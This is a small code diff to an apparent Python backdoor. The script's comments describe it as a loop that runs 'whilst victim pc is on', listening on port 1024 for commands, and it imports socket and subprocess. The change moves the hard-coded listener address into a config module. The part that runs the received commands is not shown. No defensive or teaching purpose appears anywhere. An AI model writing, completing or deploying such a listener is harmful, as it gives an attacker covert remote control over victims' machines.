@@ -1,8 +1,8 @@
 #Imports required for this file
+import config
 import socket
 import subprocess
 
-HOST = "192.168.56.105"
 PORT = 1024
 
 #Main loop staying true whilst victim pc is on
@@ -12,7 +12,7 @@ while True:
 	s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 
 	#Sets socket to host info
-	s.bind((HOST, PORT))
+	s.bind((config.HOST, PORT))
 	#Starts listening and waiting for commands
 	s.listen(0)
 
